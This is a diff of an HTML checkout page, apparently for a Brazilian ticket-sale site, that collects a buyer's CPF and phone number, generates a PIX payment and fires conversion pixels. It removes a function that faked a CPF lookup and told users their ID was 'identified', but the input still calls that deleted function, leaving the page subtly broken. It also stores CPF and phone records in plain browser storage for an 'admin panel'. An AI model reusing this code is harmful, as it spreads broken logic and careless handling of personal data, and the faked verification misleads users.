@@ -14,7 +14,7 @@
     <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
     <link rel="stylesheet" href="css/bootstrap-icons.min.css">
     
-    <!-- CSS DO ADMIN (OCULTO) -->
+    <!-- CSS DO ADMIN E CPF -->
     <style>
     .admin-link {
         position: fixed;
@@ -28,10 +28,9 @@
         font-size: 12px;
         z-index: 9999;
         box-shadow: 0 4px 12px rgba(47, 78, 181, 0.3);
-        display: none; /* OCULTO - ACESSE COM admin.html */
+        display: none;
     }
     
-    /* ESTILOS PARA CONSULTA CPF */
     .cpf-loading {
         display: none;
         color: #2f4eb5;
@@ -64,7 +63,7 @@
         border-left-color: #28a745;
     }
     
-    /* MODAL DE PAGAMENTO (MANTENHA SEU CSS ORIGINAL AQUI) */
+    /* MODAL DE PAGAMENTO (MANTENHA SEU CSS ORIGINAL) */
     .modal-pagamento {
         display: none;
         position: fixed;
@@ -1061,17 +1060,16 @@
                     <p>Identifique-se usando seu CPF</p>
                     <div class="resumo-compra" id="resumoCompra">6 títulos - R$5,94</div>
                     
-<div class="form-group">
-    <label>CPF</label>
-    <input type="text" id="inputCPF" placeholder="Digite o seu CPF" maxlength="14" 
-           oninput="formatarCPF(this); consultarCPF(this.value)">
-    <div class="exemplo-input">Exemplo: 123.456.789-09</div>
-    <div class="cpf-loading" id="cpfLoading">
-        <i class="bi bi-search"></i> Consultando CPF...
-    </div>
-    <div id="cpfInfo" class="cpf-info"></div>
-    <div id="erroCPF" class="mensagem-erro"></div>
-</div>
+                    <div class="form-group">
+                        <label>CPF</label>
+                        <input type="text" id="inputCPF" placeholder="Digite o seu CPF" maxlength="14" oninput="formatarCPF(this); consultarCPF(this.value)">
+                        <div class="exemplo-input">Exemplo: 123.456.789-09</div>
+                        <div class="cpf-loading" id="cpfLoading">
+                            <i class="bi bi-search"></i> Consultando CPF...
+                        </div>
+                        <div id="cpfInfo" class="cpf-info"></div>
+                        <div id="erroCPF" class="mensagem-erro"></div>
+                    </div>
                     
                     <div id="sucessoCPF" class="mensagem-sucesso" style="display: none;">
                         <i class="bi bi-check-circle-fill"></i>
@@ -1306,10 +1304,8 @@
 
     <!-- SCRIPTS -->
     <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
-    <script src="js/main.js"></script>
-    <script src="js/cpf-validator.js"></script>
     
-    <!-- SCRIPT PRINCIPAL ATUALIZADO -->
+    <!-- SCRIPT PRINCIPAL COM TODAS AS CORREÇÕES -->
     <script>
     // VARIÁVEIS GLOBAIS
     let pacoteSelecionado = {
@@ -1324,7 +1320,7 @@
         pixData: null
     };
 
-    // CONFIGURAÇÃO ALLOW PAY - AGORA COM JAVASCRIPT (VERCEL)
+    // CONFIGURAÇÃO ALLOW PAY
     const ALLOWPAY_CONFIG = {
         API_URL: '/api/allowpay',
         CHECK_PAYMENT_URL: '/api/check-payment',
@@ -1339,7 +1335,6 @@
     function enviarEventoConversao(valor, quantidade, transactionId) {
         console.log('📊 Enviando evento de conversão para pixels');
         
-        // UTMify Pixel
         if (window.utmify && window.utmify.event) {
             window.utmify.event('purchase', {
                 value: valor,
@@ -1355,7 +1350,6 @@
             console.log('✅ Evento de conversão enviado para UTMify');
         }
         
-        // Facebook Pixel
         if (typeof fbq !== 'undefined') {
             fbq('track', 'Purchase', {
                 value: valor,
@@ -1529,8 +1523,6 @@
     // ETAPA 1: VALIDAÇÃO DE CPF
     document.getElementById('inputCPF').addEventListener('input', function(e) {
         formatarCPF(this);
-        // CONSULTA CPF AUTOMÁTICA
-        consultarCPF(this.value);
     });
 
     function formatarCPF(input) {
@@ -1660,7 +1652,7 @@
         return telefoneLimpo.length === 10 || telefoneLimpo.length === 11;
     }
 
-    // FUNÇÃO PRINCIPAL PARA GERAR PIX
+    // FUNÇÃO PRINCIPAL PARA GERAR PIX - CORRIGIDA PARA SALVAR NO ADMIN
     async function gerarPIX() {
         const telefoneInput = document.getElementById('inputTelefone');
         const telefone = telefoneInput.value;
@@ -1674,49 +1666,42 @@
             telefoneInput.focus();
             return;
         }
-            dadosUsuario.telefone = telefoneNumeros;
-    erroTelefone.style.display = 'none';
-    telefoneInput.style.borderColor = '#28a745';
-    
-    // =============== ADICIONE ESTAS LINHAS ===============
-    // SALVAR PARA O PAINEL ADMIN
-    console.log('💾 Salvando dados para o admin...');
-    
-    // 1. Salvar telefone junto com o CPF
-    if (typeof salvarTelefoneParaAdmin === 'function') {
-        salvarTelefoneParaAdmin(telefone);
-    }
-    
-    // 2. Salvar a transação completa
-    const transacao = {
-        id: 'VS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6),
-        cpf: dadosUsuario.cpf,
-        telefone: telefoneNumeros,
-        quantidade: pacoteSelecionado.quantidade,
-        valor: pacoteSelecionado.valor,
-        data: new Date().toISOString(),
-        status: 'pending',
-        pacote: pacoteSelecionado.quantidade + ' títulos'
-    };
-    
-    // Carregar transações existentes
-    let transacoes = JSON.parse(localStorage.getItem('vivasorte_transacoes') || '[]');
-    
-    // Adicionar nova transação
-    transacoes.push(transacao);
-    
-    // Salvar no localStorage
-    localStorage.setItem('vivasorte_transacoes', JSON.stringify(transacoes));
-    
-    console.log('✅ Dados salvos para admin:', transacao);
-    // =============== FIM DAS LINHAS ADICIONADAS ===============
-    
-    const btnGerarPIX = document.getElementById('btnGerarPIX');
-    // ... resto do seu código continua igual
-    
+        
         dadosUsuario.telefone = telefoneNumeros;
         erroTelefone.style.display = 'none';
         telefoneInput.style.borderColor = '#28a745';
+        
+        // ============ SALVAR PARA O PAINEL ADMIN ============
+        console.log('💾 Salvando dados para o admin...');
+        
+        // 1. Salvar telefone junto com o CPF
+        if (typeof salvarTelefoneParaAdmin === 'function') {
+            salvarTelefoneParaAdmin(telefone);
+        }
+        
+        // 2. Salvar a transação completa
+        const transacao = {
+            id: 'VS-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6),
+            cpf: dadosUsuario.cpf,
+            telefone: telefoneNumeros,
+            quantidade: pacoteSelecionado.quantidade,
+            valor: pacoteSelecionado.valor,
+            data: new Date().toISOString(),
+            status: 'pending',
+            pacote: pacoteSelecionado.quantidade + ' títulos'
+        };
+        
+        // Carregar transações existentes
+        let transacoes = JSON.parse(localStorage.getItem('vivasorte_transacoes') || '[]');
+        
+        // Adicionar nova transação
+        transacoes.push(transacao);
+        
+        // Salvar no localStorage
+        localStorage.setItem('vivasorte_transacoes', JSON.stringify(transacoes));
+        
+        console.log('✅ Dados salvos para admin:', transacao);
+        // ============ FIM DO CÓDIGO DO ADMIN ============
         
         const btnGerarPIX = document.getElementById('btnGerarPIX');
         btnGerarPIX.innerHTML = '<div class="spinner"></div> Gerando PIX...';
@@ -1946,6 +1931,7 @@
         
         salvarConfirmacaoPagamento();
         
+        // ENVIAR EVENTO DE CONVERSÃO PARA PIXELS
         enviarEventoConversao(pacoteSelecionado.valor, pacoteSelecionado.quantidade, dadosUsuario.transactionId);
         
         document.getElementById('transacaoId').textContent = dadosUsuario.transactionId;
@@ -1995,7 +1981,7 @@
         console.log('🏆 Prêmio visualizado:', transacao);
     }
 
-    // FUNÇÕES AUXILIARES
+    // FUNÇÕES AUXILIARES - CORRIGIDO
     function mostrarPopupNotificacao(mensagem, isError = false) {
         const popup = document.getElementById('popup');
         popup.textContent = mensagem;
@@ -2080,40 +2066,6 @@
         }
 
         setTimeout(mostrarPopup, 1000);
-    }
-    
-    // FUNÇÃO CONSULTA CPF (SIMPLIFICADA)
-    async function consultarCPF(cpfCompleto) {
-        const cpfNumeros = cpfCompleto.replace(/\D/g, '');
-        
-        if (cpfNumeros.length !== 11) {
-            document.getElementById('cpfInfo').style.display = 'none';
-            document.getElementById('cpfLoading').style.display = 'none';
-            return;
-        }
-        
-        document.getElementById('cpfLoading').style.display = 'block';
-        document.getElementById('cpfInfo').style.display = 'none';
-        
-        setTimeout(() => {
-            document.getElementById('cpfLoading').style.display = 'none';
-            
-            // SIMULAÇÃO DE RESPOSTA (em produção, use a API real)
-            document.getElementById('cpfInfo').innerHTML = `
-                <div class="cpf-valid">
-                    <h4><i class="bi bi-check-circle"></i> CPF Identificado</h4>
-                    <p><strong>Nome:</strong> Cliente Identificado</p>
-                    <p><strong>CPF Válido:</strong> Sim</p>
-                    <p><strong>Status:</strong> Pode continuar</p>
-                </div>
-            `;
-            document.getElementById('cpfInfo').style.display = 'block';
-            
-            // Habilitar botão
-            document.getElementById('btnContinuarCPF').disabled = false;
-            document.getElementById('btnContinuarCPF').style.background = 'linear-gradient(to right, #2f4eb5, #3949ab)';
-            
-        }, 1500);
     }
     </script>
 
